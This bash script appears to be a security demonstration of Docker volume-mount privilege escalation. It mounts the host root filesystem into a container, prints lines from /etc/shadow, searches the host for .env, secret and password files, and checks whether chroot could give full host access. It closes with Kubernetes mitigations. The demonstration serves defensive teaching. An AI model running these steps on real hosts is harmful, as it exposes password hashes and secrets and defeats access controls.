#!/bin/bash
# Attack Scenario: Volume Mount Privilege Escalation
# Demonstrates how a user with Docker access can compromise the host

set -e

echo "🚨 ATTACK SCENARIO: Volume Mount Privilege Escalation"
echo "=================================================="
echo ""
echo "This demonstrates the PDO incident attack pattern:"
echo "- Attacker has Docker daemon access"
echo "- Mounts host filesystem into container"
echo "- Gains full host access via chroot"
echo ""

read -p "⚠️  Run this attack demonstration? (yes/no): " confirm
if [ "$confirm" != "yes" ]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "Step 1: Running container with host filesystem mounted..."
echo "Command: docker run -it --rm -v /:/host alpine sh"
echo ""

# Create a test script to run inside container
cat > /tmp/attack-script.sh <<'EOF'
#!/bin/sh
echo "✅ Inside container"
echo ""

echo "Step 2: Exploring host filesystem..."
ls -la /host/etc/ | head -n 10
echo ""

echo "Step 3: Reading sensitive files..."
echo "Contents of /host/etc/hostname:"
cat /host/etc/hostname
echo ""

if [ -f /host/etc/shadow ]; then
    echo "⚠️  Can read /host/etc/shadow (password hashes):"
    head -n 3 /host/etc/shadow
    echo ""
fi

echo "Step 4: Searching for secrets..."
find /host -name "*.env" -o -name "*secret*" -o -name "*password*" 2>/dev/null | head -n 10
echo ""

echo "Step 5: Checking if we can chroot to host..."
if command -v chroot >/dev/null 2>&1; then
    echo "✅ chroot is available"
    echo "⚠️  Could execute: chroot /host"
    echo "⚠️  This would give full host access!"
else
    echo "chroot not available in this image"
fi
echo ""

echo "🚨 ATTACK SUCCESSFUL!"
echo "===================="
echo "- Read host filesystem"
echo "- Found sensitive files"
echo "- Could potentially chroot to gain root access"
echo ""
echo "This is why hostPath volumes must be blocked!"
EOF

chmod +x /tmp/attack-script.sh

# Run the attack
docker run -it --rm \
    -v /:/host \
    -v /tmp/attack-script.sh:/attack.sh \
    alpine sh /attack.sh

echo ""
echo "=================================================="
echo "MITIGATIONS:"
echo "=================================================="
echo "1. ✅ Use Pod Security Standards (restricted)"
echo "2. ✅ Block hostPath volumes with admission controllers"
echo "3. ✅ RBAC - developers can't create pods"
echo "4. ✅ Use GitOps - no manual kubectl/docker commands"
echo "5. ✅ Audit logging - detect attempts"
echo ""
echo "See: kubernetes/policies/block-hostpath-volumes.yaml"
